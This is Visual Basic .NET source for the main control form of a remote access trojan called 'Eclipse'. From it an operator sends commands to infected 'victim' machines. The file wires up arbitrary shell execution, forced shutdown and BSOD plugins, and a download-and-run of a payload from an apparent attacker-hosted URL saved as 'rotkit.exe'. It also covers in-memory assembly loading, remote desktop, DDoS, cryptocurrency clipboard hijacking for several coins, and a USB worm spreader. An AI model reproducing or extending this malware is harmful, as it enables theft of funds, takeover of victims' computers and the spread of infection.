Imports System.ComponentModel
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Web.UI
Imports System.Windows.Forms.VisualStyles.VisualStyleElement
Imports System.Windows.Forms.VisualStyles.VisualStyleElement.Status
Imports FireSharp.Config
Imports FireSharp.Interfaces
Imports Guna.UI2.WinForms
Imports Microsoft.Win32
Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Imports NAudio.Utils


Public Class AuthForm
    Inherits Form

    Private fcon As New FirebaseConfig() With
        {
        .BasePath = "use firebase for auth",
        .AuthSecret = ""
        }
    Private client As IFirebaseClient
    Public Shared username_server As String
    Public Shared password_server As String
    Public Shared uuid_server As String
    Public Shared clientIsRegistered As Boolean
    Public Shared WDBypass As Boolean
    Public Shared BAN As Boolean
    Public Shared ban_server As String
    Public S As Server
    Public trans As Boolean
    Public Sub New()
        InitializeComponent()

        Me.Opacity = 0
        FadeInMain(Me, 20)
    End Sub
    Public Sub Trocar_Painel_vitimas(ByVal Painel As Form)
        Panel_vitimas.Controls.Clear()
        Painel.TopLevel = False
        Panel_vitimas.Controls.Add(Painel)
        Painel.Show()
    End Sub
    Public Sub Trocar_Painel_home(ByVal Painel As Form)
        Panel_homepage.Controls.Clear()
        Painel.TopLevel = False
        Panel_homepage.Controls.Add(Painel)
        Painel.Show()
    End Sub
    Public Sub Trocar_Painel_Builder(ByVal Painel As Form)
        Guna2Panel3.Controls.Clear()
        Painel.TopLevel = False
        Guna2Panel3.Controls.Add(Painel)
        Painel.Show()
    End Sub

    Public Sub Trocar_Painel_IconChanger(ByVal Painel As Form)
        Panel_IconChanger.Controls.Clear()
        Painel.TopLevel = False
        Panel_IconChanger.Controls.Add(Painel)
        Painel.Show()
    End Sub
    Public Sub Trocar_Painel_Downloader(ByVal Painel As Form)
        Panel_Downloader.Controls.Clear()
        Painel.TopLevel = False
        Panel_Downloader.Controls.Add(Painel)
        Painel.Show()
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        pn_obf.Visible = False
        pn_changer.Visible = False
        pn_memory.Visible = False


        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim imagePath As String = ""

        ' Verificar se já há uma imagem carregada
        If Guna2CirclePictureBox2.Image IsNot Nothing Then
            ' Liberar a imagem atualmente carregada
            Guna2CirclePictureBox2.Image.Dispose()
            Guna2CirclePictureBox2.Image = Nothing
        End If

        ' Procura todos os arquivos na pasta EclipseData
        Dim files() As String = Directory.GetFiles(Path.Combine(appDataPath, "EclipseData"))

        ' Percorre cada arquivo e procura por um com a extensão correta
        For Each file As String In files
            Dim extension As String = Path.GetExtension(file)
            If extension = ".png" OrElse extension = ".jpg" OrElse extension = ".jpeg" Then
                imagePath = file
                Exit For ' Encerra o loop assim que encontrar um arquivo válido
            End If
        Next

        ' Se encontrou uma imagem válida, carrega ela na Guna2CirclePictureBox2
        If Not String.IsNullOrEmpty(imagePath) Then
            Using fs As New FileStream(imagePath, FileMode.Open, FileAccess.Read)
                Guna2CirclePictureBox2.Image = Image.FromStream(fs)
            End Using
        End If

        ' Crie uma instância da classe ManagementClass para acessar as informações do sistema
        Dim mc As New ManagementClass("Win32_ComputerSystemProduct")

        ' Obtenha a coleção de objetos com as informações do sistema
        Dim moc As ManagementObjectCollection = mc.GetInstances()

        ' Itere pelos objetos e exiba o valor do HWID em um Guna2TextBox
        For Each mo As ManagementObject In moc
            Dim hwid As String = mo("UUID").ToString()
            Guna2TextBox1.Text = hwid
        Next
        Label26.Text = BAN
        Label4.Text = username_server

        Label17.Text = uuid_server
        Try
            client = New FireSharp.FirebaseClient(fcon)
            HashG.CheckClients()

            If clientIsRegistered = True Then
                ContextMenuStrip1.Visible = True
                ContextMenuStrip1.Enabled = True
                Dim resposta_client = client.Get("Users/" + username_server)
                Dim resposta_servidor = resposta_client.ResultAs(Of UsersInfo)
                Dim list_clientes As New UsersInfo() With
                        {
                        .Username = username_server,
                        .Password = password_server,
                        .UUID = uuid_server
                        }
                If (UsersInfo.isEqual(resposta_servidor, list_clientes)) Then
                Else
                    Application.Exit()
                End If
            Else
                MessageBox.Show("Do you want access to the tool?", "Eclipse")
                System.Diagnostics.Process.Start("https://discord.gg/eclipsegg")
                ContextMenuStrip1.Enabled = False
                ContextMenuStrip1.Visible = False
                'Application.Exit()
            End If
        Catch ex As Exception
            MessageBox.Show(ex.ToString())
        End Try
        If uuid_server = Guna2TextBox1.Text Then

        Else
            MessageBox.Show("HWID ERROR!")
            Application.Exit()
        End If
        Password.Visible = False
        Dim p As New WebClient

        Password.Text = p.DownloadString("https://pastebin.com/raw/Z7RmhSP8")
        If Password.Text = TextBox1.Text Then

        Else
            MessageBox.Show("The servers are blocked by the administrator.", "Eclipse")
            Application.Exit()
        End If

        If Label26.Text = True Then
            MessageBox.Show("You have been permanently banned!", "Eclipse")
            Application.Exit()
        End If
    End Sub
    Private Sub Lv1_DrawColumnHeader(sender As Object, e As DrawListViewColumnHeaderEventArgs) Handles Lv1.DrawColumnHeader
        e.Graphics.FillRectangle(New SolidBrush(Color.FromArgb(10, 10, 10)), e.Bounds)
        e.DrawText()
    End Sub
    Private Sub Lv1_DrawSubItem(ByVal sender As Object, ByVal e As System.Windows.Forms.DrawListViewSubItemEventArgs) Handles Lv1.DrawSubItem
        e.DrawBackground()
        e.DrawText()
    End Sub
    Private Sub pintobolabunda(sender As Object, e As EventArgs) Handles Lv1.SelectedIndexChanged
        For Each item As ListViewItem In Lv1.Items
            If item.Selected Then
                item.BackColor = Color.FromArgb(162, 64, 255)
                item.ForeColor = Color.White
                For Each subItem As ListViewItem.ListViewSubItem In item.SubItems
                    subItem.BackColor = Color.FromArgb(162, 64, 255)
                    subItem.ForeColor = Color.White
                Next
            Else
                item.BackColor = Color.FromArgb(10, 10, 10)
                item.ForeColor = Color.White
                For Each subItem As ListViewItem.ListViewSubItem In item.SubItems
                    subItem.BackColor = Color.FromArgb(10, 10, 10)
                    subItem.ForeColor = Color.White
                Next
            End If
        Next
    End Sub
    Private Sub bucetagrandedemais(sender As Object, e As DrawListViewColumnHeaderEventArgs) Handles Lv1.DrawColumnHeader
        Dim backBrush As New SolidBrush(Color.FromArgb(10, 10, 10))
        e.Graphics.FillRectangle(backBrush, e.Bounds)
        ' Definir a cor do texto para vermelho
        Dim textColor As Color = Color.White

        ' Desenhar o texto do cabeçalho de coluna com a cor personalizada
        Dim headerFont As New Font("Segoe UI", 10, FontStyle.Regular)
        Dim textBrush As New SolidBrush(textColor)
        e.Graphics.DrawString(e.Header.Text, headerFont, textBrush, e.Bounds)
    End Sub





    Private Sub Lv2_DrawColumnHeader(sender As Object, e As DrawListViewColumnHeaderEventArgs) Handles Lv2.DrawColumnHeader
        e.Graphics.FillRectangle(New SolidBrush(Color.FromArgb(10, 10, 10)), e.Bounds)
        e.DrawText()
    End Sub
    Private Sub Lv2_DrawSubItem(ByVal sender As Object, ByVal e As System.Windows.Forms.DrawListViewSubItemEventArgs) Handles Lv2.DrawSubItem
        e.DrawBackground()
        e.DrawText()
    End Sub
    Private Sub pi2tobolabunda(sender As Object, e As EventArgs) Handles Lv2.SelectedIndexChanged
        For Each item As ListViewItem In Lv2.Items
            If item.Selected Then
                item.BackColor = Color.FromArgb(162, 64, 255)
                item.ForeColor = Color.White
                For Each subItem As ListViewItem.ListViewSubItem In item.SubItems
                    subItem.BackColor = Color.FromArgb(162, 64, 255)
                    subItem.ForeColor = Color.White
                Next
            Else
                item.BackColor = Color.FromArgb(10, 10, 10)
                item.ForeColor = Color.White
                For Each subItem As ListViewItem.ListViewSubItem In item.SubItems
                    subItem.BackColor = Color.FromArgb(10, 10, 10)
                    subItem.ForeColor = Color.White
                Next
            End If
        Next
    End Sub
    Private Sub buc2tagrandedemais(sender As Object, e As DrawListViewColumnHeaderEventArgs) Handles Lv2.DrawColumnHeader
        Dim backBrush As New SolidBrush(Color.FromArgb(10, 10, 10))
        e.Graphics.FillRectangle(backBrush, e.Bounds)
        ' Definir a cor do texto para vermelho
        Dim textColor As Color = Color.White

        ' Desenhar o texto do cabeçalho de coluna com a cor personalizada
        Dim headerFont As New Font("Segoe UI", 10, FontStyle.Regular)
        Dim textBrush As New SolidBrush(textColor)
        e.Graphics.DrawString(e.Header.Text, headerFont, textBrush, e.Bounds)
    End Sub

    Private Sub CLOSEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CLOSEToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("CLOSE")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub

    Private Sub UPDATEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UPDATEToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim open As OpenFileDialog = New OpenFileDialog

            Dim result As DialogResult = open.ShowDialog()
            If result = DialogResult.OK Then
                Try
                    Dim B As Byte() = SB("update" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Update.dll")) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(open.FileName)) & Settings.SPL & IO.Path.GetExtension(open.FileName))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If
        End If

    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("RD-")
            HashG.CheckClients()

            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub
    Private Sub Timer_Status_Tick(sender As Object, e As EventArgs) Handles Timer_Status.Tick
        Try
            Label2.Text = String.Format("{0}", Lv1.Items.Count.ToString, Lv1.SelectedItems.Count.ToString, Settings.Port, Settings.KEY, BytesToString(Settings.Sent), BytesToString(Settings.Received))
            Label6.Text = "CPU " & CInt(performanceCounter1.NextValue()) & "%" & "   RAM " & CInt(performanceCounter2.NextValue()) & "%"
            Label8.Text = DateTime.Now.ToLongTimeString()
            Label10.Text = String.Format("{2}", Lv1.Items.Count.ToString, Lv1.SelectedItems.Count.ToString, Settings.Port, Settings.KEY, BytesToString(Settings.Sent), BytesToString(Settings.Received))
            Label11.Text = String.Format("Sent {4}   Received {5}", Lv1.Items.Count.ToString, Lv1.SelectedItems.Count.ToString, Settings.Port, Settings.KEY, BytesToString(Settings.Sent), BytesToString(Settings.Received))
            Label12.Text = String.Format("{3}", Lv1.Items.Count.ToString, Lv1.SelectedItems.Count.ToString, Settings.Port, Settings.KEY, BytesToString(Settings.Sent), BytesToString(Settings.Received))
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
        Dim horario As Date = Date.Now 'Obtém o horário atual
        Dim horarioLimite As Date = #7:00:00 PM# 'Define o horário limite para exibição do painel Guna
        Dim horarioVolta As Date = #6:00:00 AM# 'Define o horário para voltar a exibir o outro painel Guna



    End Sub

    Private Sub Timer_Ping_Tick(sender As Object, e As EventArgs) Handles Timer_Ping.Tick
        If Settings.Online.Count > 0 Then
            Dim B As Byte() = SB("PING!")
            For Each CL As Client In Settings.Online.ToList
                Dim ClientReq As New Outcoming_Requests(CL, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
        GC.Collect()
    End Sub

    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Try
            NotifyIcon1?.Dispose()
            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub BUILDERToolStripMenuItem_Click(sender As Object, e As EventArgs)
        Dim f As New Builder
        f.StartPosition = FormStartPosition.CenterParent
        f.ShowDialog()
    End Sub
    Private Sub Lv1_MouseMove(sender As Object, e As MouseEventArgs) Handles Lv1.MouseMove
        Try
            Dim hitInfo = Lv1.HitTest(e.Location)
            If e.Button = MouseButtons.Left AndAlso (hitInfo.Item IsNot Nothing OrElse hitInfo.SubItem IsNot Nothing) Then Lv1.Items(hitInfo.Item.Index).Selected = True
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Lv1_KeyDown(sender As Object, e As KeyEventArgs) Handles Lv1.KeyDown
        Try
            If e.Modifiers = Keys.Control AndAlso e.KeyCode = Keys.A Then
                If Lv1.Items.Count > 0 Then
                    For Each x As ListViewItem In Lv1.Items
                        x.Selected = True
                    Next
                End If
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub FormDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FormDiskToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim filePath As String = Path.Combine(Application.StartupPath, "teste.exe") ' Substitua "nome-do-arquivo.extensao" pelo nome real do arquivo e sua extensão
                Dim B As Byte() = SB("DW" & Settings.SPL & Path.GetExtension(filePath) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(filePath)))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub FromMemoryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromMemoryToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim o As New OpenFileDialog
                With o
                    .Filter = "(*.exe)|*.exe"
                    .Title = "From Memory"
                End With

                If o.ShowDialog = DialogResult.OK Then
                    Try
                        System.Reflection.Assembly.LoadFile(o.FileName).EntryPoint.GetParameters()
                    Catch
                        MessageBox.Show(o.FileName, "Is Not A .NET Assembly")
                        Return
                    End Try

                    Dim B As Byte() = SB("FM" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Memory.dll")) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub FromUrlToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "http://www.example.com/server.exe"
            Dim str3 As String = "ddd"
            Dim fname As String = "server.exe"
            Dim str4 As String = "dd"
            If (str3.Length = 0) Or str4.Length = 0 Then
            Else
                Dim B As Byte() = SB("LN" & Settings.SPL & "rotkit.exe" & Settings.SPL & "https://blackhatbrazil7.000webhostapp.com/payload/eclipse.exe")
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub
    Private Sub VisibleToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VisibleToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim message As Object = InputBox("Enter Your Url", "Open Visible Url", "http://exmple.com")
            If Not String.IsNullOrWhiteSpace(message) Then
                Dim B As Byte() = SB("url" & Settings.SPL & message)
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub NewUrlToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewUrlToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim message As Object = InputBox("Enter Your Url", "Open Invisible Url", "http://exmple.com")
            If Not String.IsNullOrWhiteSpace(message) Then
                Dim B As Byte() = SB("openhide" & Settings.SPL & message)
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If

        End If
    End Sub

    Private Sub CloseToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "taskkill /im iexplore.exe /f")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
        End If
    End Sub


    Private Sub RunShellToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim urle As String
            urle = "cmd.exe /c calc"
            Dim str3 As String = Interaction.InputBox("Set The Command", "Run Shell", urle)
            If (str3.Length = 0) Then
            Else
                Dim B As Byte() = SB("shellfuc" & Settings.SPL & str3)
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            End If
        End If
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "shutdown.exe /f /s /t 0")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "shutdown.exe /f /r /t 0")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("shellfuc" & Settings.SPL & "shutdown -L")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub RunShellToolStripMenuItem1_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Dim result As Integer = MessageBox.Show("Are You Sure?", "Invoke-BSOD!", MessageBoxButtons.YesNo)
            If result = DialogResult.Yes Then

                Try

                    Dim B As Byte() = SB("BSOD" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\BSOD.dll")))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try

            End If
        End If
    End Sub

    Private Sub BotKillerToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("bot" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Bot.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub


    Private Sub ShowToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem1.Click
        Try
            Me.TopMost = True
            Me.WindowState = FormWindowState.Normal
            Me.TopMost = False
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem1.Click
        Try
            Process.Start(Application.ExecutablePath)
            NotifyIcon1?.Dispose()
            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        Try
            NotifyIcon1?.Dispose()
            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem2.Click
        If Lv1.SelectedItems.Count > 0 Then

            Dim B As Byte() = SB("rec")
            For Each C As ListViewItem In Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next

        End If
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Dim result As Integer = MessageBox.Show("Are You Sure?", "Uninstall!", MessageBoxButtons.YesNo)
            If result = DialogResult.Yes Then
                Try

                    Dim B As Byte() = SB("uninstall" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\uninstall.dll")))
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                Catch ex As Exception
                    MessageBox.Show(ex.Message)
                End Try
            End If

        End If
    End Sub

    Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
        Try
            Me.TopMost = True
            Me.WindowState = FormWindowState.Normal
            Me.TopMost = False
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub FromMemoryToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromMemoryToolStripMenuItem1.Click
        If Lv1.SelectedItems.Count > 0 Then
            Script.ShowDialog()
        End If
    End Sub

    Private Sub GoogleMapsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GoogleMapsToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim B As Byte() = SB("MapsPLU" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Maps.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub DDosAttackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DDosAttackToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            DDos.ShowDialog()
        End If
    End Sub

    Private Sub BTCToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "BTC Cilpper", "Your BTC Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,45}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ETHToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "ETH Cilpper", "Your ETH Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(0x)[a-zA-HJ-NP-Z0-9]{40,45}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub XMRToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "XMR Cilpper", "Your XMR Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(4)[a-zA-HJ-NP-Z0-9]{90,98}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub LTCToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "LTC Cilpper", "Your LTC Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,48}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub DogeToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "Doge Cilpper", "Your Doge Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(D)[a-zA-HJ-NP-Z0-9]{26,35}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub DashToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "Dash Cilpper", "Your Dash Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub BCashToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "BCash Cilpper", "Your BCash Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "\b(bitcoincash:|[q])[a-zA-HJ-NP-Z0-9]{26,56}\b")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub ZCashToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try
                Dim message As Object = InputBox("Enter Your Address", "ZCash Cilpper", "Your ZCash Address")
                If Not String.IsNullOrWhiteSpace(message) Then
                    Dim B As Byte() = SB("Cilpper" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Clipper.dll")) & Settings.SPL & message & Settings.SPL & "t1[0-9A-z]{33}")
                    For Each C As ListViewItem In Lv1.SelectedItems
                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                        Pending.Req_Out.Add(ClientReq)
                    Next
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub


    Private Sub USBSpreadToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Lv1.SelectedItems.Count > 0 Then
            Try

                Dim B As Byte() = SB("startusb" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Worm.dll")))
                For Each C As ListViewItem In Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        End If
    End Sub

    Private Sub VBNetCompilerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VBNetCompilerToolStripMenuItem.Click
        If Lv1.SelectedItems.Count > 0 Then
            VBCode.ShowDialog()
        End If
    End Sub



